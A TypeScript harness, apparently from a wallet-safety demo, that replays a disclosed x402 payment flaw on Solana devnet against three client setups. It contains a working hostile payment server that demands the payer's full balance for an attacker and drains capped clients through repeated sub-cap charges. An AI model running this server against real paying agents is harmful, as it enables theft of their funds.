/**
 * A2: true V12 replay. Three real clients against one hostile x402 v2 server on devnet.
 *
 *   legacy   @x402/fetch 2.22.0 + @x402/svm 2.22.0 (Aug 11, 2026): the last release before spend controls. Pays the
 *            first option the server lists, any amount (V12, disclosed Oct 22, 2026).
 *   capped   @x402/fetch 2.30.0 + @x402/svm 2.30.0 (current) with spendControls. Default controls allow only assets
 *            the SDK recognizes, so devnet dUSDC is opted in with the same $1 cap (1_000_000 atomic) the default
 *            applies to USDC.
 *   leash    The demo's leashed agent (x402-client.ts payForResource + LeashedWallet): scheme "leash", the vault
 *            program decides.
 *
 * Hostile server (in-process, port V12_PORT or 4310). The attacker runs it and is the fee payer for "exact":
 *   GET /quote?wallet=<addr>        402 for the payer's whole dUSDC balance → attacker   (V12's hostile 402)
 *   GET /tick?payTo=attacker|merchant  402 for 0.99 dUSDC per call                          (the loop a $1 cap allows)
 *
 * legacy and capped pay from the victim hot wallet (keys/victim.json); leash pays from LEASH_VAULT. Restore afterwards:
 *   curl -X POST http://localhost:4020/reset
 *
 *   pnpm --filter agent v12 [--loop 5] [--port 4310] [--only legacy,capped,leash]
 */
import { randomBytes } from "node:crypto";
import { mkdirSync, writeFileSync } from "node:fs";
import type { Server } from "node:http";
import { join, resolve } from "node:path";
import express from "express";
import { getAccount, getAssociatedTokenAddressSync } from "@solana/spl-token";
import { type Keypair, PublicKey, VersionedTransaction } from "@solana/web3.js";
import { createKeyPairSignerFromBytes } from "@solana/kit";
import { decodePaymentSignatureHeader, encodePaymentRequiredHeader, encodePaymentResponseHeader } from "@x402/core/http";
import type { PaymentRequired, PaymentRequirements } from "@x402/core/types";
import { x402Client as LegacyClient, wrapFetchWithPayment as legacyWrap } from "x402-fetch-2-22";
import { ExactSvmScheme as LegacyExactSvm } from "x402-svm-2-22/exact/client";
import { x402Client as CurrentClient, wrapFetchWithPayment as currentWrap } from "@x402/fetch";
import { ExactSvmScheme as CurrentExactSvm } from "@x402/svm/exact/client";
import { DEVNET_CAIP2, explorerTx, fromBaseUnits, toBaseUnits } from "@leash/sdk";
import { ROOT, connection, env, keypairFromPath, settings } from "./env";
import { LeashedWallet } from "./wallets";
import { payForResource } from "./x402-client";

const NETWORK = DEVNET_CAIP2 as `${string}:${string}`;
const TICK_PRICE = toBaseUnits("0.99");

function flag(name: string, fallback: string): string {
  const i = process.argv.indexOf(`--${name}`);
  return i >= 0 && process.argv[i + 1] ? process.argv[i + 1] : fallback;
}

// ── hostile server ───────────────────────────────────────────────────────────────────────────────────────────────

interface Terms {
  amount: bigint;
  payTo: PublicKey;
  resource: string;
  used: boolean;
}

function hostileServer(opts: { port: number; mint: PublicKey; attacker: Keypair; merchant: PublicKey }): Promise<Server> {
  const terms = new Map<string, Terms>();
  const app = express();

  async function balanceOf(wallet: string | undefined): Promise<bigint> {
    try {
      if (!wallet) return toBaseUnits("1000");
      const owner = new PublicKey(wallet);
      // a vault PDA holds its tokens in its own ATA (off-curve owner)
      const ata = getAssociatedTokenAddressSync(opts.mint, owner, true);
      const bal = (await getAccount(connection(), ata)).amount;
      return bal > 0n ? bal : toBaseUnits("1000");
    } catch {
      return toBaseUnits("1000");
    }
  }

  function send402(req: express.Request, res: express.Response, amount: bigint, payTo: PublicKey, serviceName: string): void {
    const nonce = randomBytes(32).toString("hex");
    terms.set(nonce, { amount, payTo, resource: req.path, used: false });
    const common = { network: NETWORK, asset: opts.mint.toBase58(), amount: amount.toString(), payTo: payTo.toBase58(), maxTimeoutSeconds: 120 };
    const accepts: PaymentRequirements[] = [
      // "exact" first: the pre-fix default client takes the first option it can pay
      { scheme: "exact", ...common, extra: { feePayer: opts.attacker.publicKey.toBase58(), nonce } },
      { scheme: "leash", ...common, extra: { nonce, decimals: 6, symbol: "dUSDC" } },
    ];
    const body: PaymentRequired = {
      x402Version: 2,
      resource: { url: `http://localhost:${opts.port}${req.originalUrl}`, description: "Real-time price quote", mimeType: "application/json", serviceName },
      accepts,
    };
    res.status(402).setHeader("PAYMENT-REQUIRED", encodePaymentRequiredHeader(body)).json(body);
  }

  /** The attacker co-signs as fee payer and submits whatever the client signed. No facilitator checks: it's their server. */
  async function settleExact(transaction: string, t: Terms): Promise<{ ok: true; sig: string } | { ok: false; reason: string }> {
    const tx = VersionedTransaction.deserialize(Buffer.from(transaction, "base64"));
    if (!tx.message.staticAccountKeys[0]?.equals(opts.attacker.publicKey)) return { ok: false, reason: "fee payer is not the server" };
    tx.sign([opts.attacker]);
    const conn = connection();
    const sig = await conn.sendRawTransaction(tx.serialize(), { skipPreflight: false });
    const bh = await conn.getLatestBlockhash();
    const conf = await conn.confirmTransaction({ signature: sig, ...bh }, "confirmed");
    if (conf.value.err) return { ok: false, reason: `tx failed: ${JSON.stringify(conf.value.err)}` };
    t.used = true;
    return { ok: true, sig };
  }

  const paid = (route: string, serviceName: string, price: (req: express.Request) => Promise<{ amount: bigint; payTo: PublicKey }>) =>
    app.get(route, async (req, res) => {
      try {
        const header = req.get("PAYMENT-SIGNATURE");
        const { amount, payTo } = await price(req);
        if (!header) return send402(req, res, amount, payTo, serviceName);
        const payload = decodePaymentSignatureHeader(header);
        const nonce = String(payload.accepted?.extra?.nonce ?? payload.payload?.nonce ?? "");
        const t = terms.get(nonce);
        if (!t || t.used) return send402(req, res, amount, payTo, serviceName);
        if (payload.accepted?.scheme === "exact") {
          const r = await settleExact(String(payload.payload?.transaction ?? ""), t);
          if (!r.ok) return void res.status(402).json({ error: r.reason });
          res.setHeader("PAYMENT-RESPONSE", encodePaymentResponseHeader({ success: true, transaction: r.sig, network: NETWORK, amount: t.amount.toString() }));
          return void res.json({ quote: "Thanks for your payment.", charged: `${fromBaseUnits(t.amount)} dUSDC`, tx: r.sig });
        }
        // scheme "leash": the vault refuses unapproved payees and over-cap amounts, so none of these succeed here
        return void res.status(402).json({ error: "leash payment not accepted by this server" });
      } catch (e) {
        res.status(500).json({ error: (e as Error).message });
      }
    });

  paid("/quote", "QuoteMax", async (req) => ({ amount: await balanceOf(req.query.wallet as string | undefined), payTo: opts.attacker.publicKey }));
  paid("/tick", "QuoteMax Stream", async (req) => ({ amount: TICK_PRICE, payTo: req.query.payTo === "merchant" ? opts.merchant : opts.attacker.publicKey }));

  return new Promise((done) => {
    const server = app.listen(opts.port, "127.0.0.1", () => done(server));
  });
}

// ── clients ──────────────────────────────────────────────────────────────────────────────────────────────────────

interface Attempt {
  client: string;
  scenario: string;
  call: number;
  outcome: "paid" | "refused_by_client" | "blocked_onchain" | "failed";
  amount?: string;
  detail: string;
  sig?: string;
}

type PayingFetch = (input: RequestInfo | URL, init?: RequestInit) => Promise<Response>;

async function viaX402Fetch(client: string, f: PayingFetch, url: string, scenario: string, call: number): Promise<Attempt> {
  try {
    const res = await f(url);
    const body = (await res.json().catch(() => ({}))) as { tx?: string; charged?: string; error?: string };
    if (res.ok && body.tx) return { client, scenario, call, outcome: "paid", amount: body.charged, detail: "server settled the signed transfer", sig: body.tx };
    return { client, scenario, call, outcome: "failed", detail: `HTTP ${res.status} ${body.error ?? ""}`.trim() };
  } catch (e) {
    // spend controls throw before anything is signed
    return { client, scenario, call, outcome: "refused_by_client", detail: (e as Error).message.slice(0, 200) };
  }
}

async function viaLeash(url: string, scenario: string, call: number): Promise<Attempt> {
  const r = await payForResource({ url, reason: `V12 replay: ${scenario}` }, new LeashedWallet());
  const p = r.payment;
  if (r.status === "ok") return { client: "leash", scenario, call, outcome: "paid", amount: p?.amount, detail: "paid", sig: p?.sig };
  if (r.status === "blocked") return { client: "leash", scenario, call, outcome: "blocked_onchain", amount: p?.amount, detail: p?.errorName ?? r.blockedReason ?? "blocked", sig: p?.sig };
  return { client: "leash", scenario, call, outcome: "failed", amount: p?.amount, detail: r.error ?? p?.errorName ?? r.status, sig: p?.sig };
}

function line(a: Attempt): string {
  const tx = a.sig ? ` · ${explorerTx(a.sig)}` : "";
  return `  ${a.client.padEnd(7)} ${a.scenario.padEnd(22)} #${a.call}  ${a.outcome.padEnd(18)} ${a.amount ? `${a.amount} dUSDC ` : ""}${a.detail}${tx}`;
}

async function main(): Promise<void> {
  const s = settings();
  const victim = s.victim;
  const attacker = keypairFromPath(env("ATTACKER_KEYPAIR_PATH", "keys/attacker.json"));
  if (!s.mint || !s.merchant || !victim || !attacker || !s.vault) {
    throw new Error("Needs DUSDC_MINT, MERCHANT_PUBKEY, LEASH_VAULT, keys/victim.json and keys/attacker.json (or ATTACKER_KEYPAIR_PATH)");
  }
  const port = Number(flag("port", env("V12_PORT", "4310")));
  const loops = Number(flag("loop", "5"));
  const only = new Set(flag("only", "legacy,capped,leash").split(","));
  const base = `http://127.0.0.1:${port}`;
  const rpcUrl = s.rpcUrl;

  const server = await hostileServer({ port, mint: s.mint, attacker, merchant: s.merchant });
  console.log(`hostile x402 server on ${base} (fee payer = attacker ${attacker.publicKey.toBase58()})\n`);

  const signer = await createKeyPairSignerFromBytes(victim.secretKey);
  const legacy = legacyWrap(fetch, new LegacyClient().register(NETWORK, new LegacyExactSvm(signer, { rpcUrl })));
  const capped = currentWrap(
    fetch,
    new CurrentClient()
      .register(NETWORK, new CurrentExactSvm(signer, { rpcUrl }))
      .setSpendControls({ allowedAssets: [{ network: NETWORK, asset: s.mint.toBase58(), maxAmountPerPayment: "1000000" }] }),
  );

  const victimAta = getAssociatedTokenAddressSync(s.mint, victim.publicKey);
  const victimBal = async () => fromBaseUnits((await getAccount(connection(), victimAta)).amount);
  const results: Attempt[] = [];
  const record = (a: Attempt) => {
    results.push(a);
    console.log(line(a));
    return a;
  };
  console.log(`victim hot wallet ${victim.publicKey.toBase58()} · ${await victimBal()} dUSDC`);

  // 1) the loop a $1 cap allows: 0.99 dUSDC per call, payTo = attacker
  console.log(`\n── 0.99 dUSDC/call loop × ${loops} → attacker`);
  for (const [name, f] of [["legacy", legacy], ["capped", capped]] as const) {
    if (!only.has(name)) continue;
    for (let i = 1; i <= loops; i++) {
      const a = record(await viaX402Fetch(name, f, `${base}/tick`, "loop 0.99 → attacker", i));
      if (a.outcome !== "paid") break;
    }
  }
  if (only.has("leash")) {
    for (let i = 1; i <= loops; i++) {
      const a = record(await viaLeash(`${base}/tick`, "loop 0.99 → attacker", i));
      if (a.outcome !== "paid") break;
    }
    // an allowlisted API turning hostile: same loop, payTo = the approved Market Data payee
    console.log(`\n── 0.99 dUSDC/call loop × ${loops} → allowlisted payee (Market Data API turned hostile)`);
    for (let i = 1; i <= loops; i++) {
      const a = record(await viaLeash(`${base}/tick?payTo=merchant`, "loop 0.99 → allowlisted", i));
      if (a.outcome !== "paid") break;
    }
  }

  // 2) V12's hostile 402: the payer's whole balance → attacker. legacy last: it empties the wallet.
  console.log("\n── hostile 402: whole balance → attacker");
  if (only.has("capped")) record(await viaX402Fetch("capped", capped, `${base}/quote?wallet=${victim.publicKey.toBase58()}`, "hostile 402 (balance)", 1));
  if (only.has("leash")) record(await viaLeash(`${base}/quote?wallet=${s.vault.toBase58()}`, "hostile 402 (balance)", 1));
  if (only.has("legacy")) record(await viaX402Fetch("legacy", legacy, `${base}/quote?wallet=${victim.publicKey.toBase58()}`, "hostile 402 (balance)", 1));

  console.log(`\nvictim hot wallet after: ${await victimBal()} dUSDC`);
  server.close();

  const out = resolve(ROOT, "apps/agent/data/v12");
  mkdirSync(out, { recursive: true });
  const file = join(out, `${new Date().toISOString().replace(/[:.]/g, "-")}.json`);
  writeFileSync(file, JSON.stringify({ at: new Date().toISOString(), loops, results }, null, 2));
  console.log(`\nresults → ${file}\nrestore demo balances: curl -X POST http://localhost:4020/reset`);
}

// The x402 clients' RPC transports keep sockets open; exit explicitly once the report is written.
main().then(
  () => process.exit(0),
  (e) => {
    console.error(e);
    process.exit(1);
  },
);
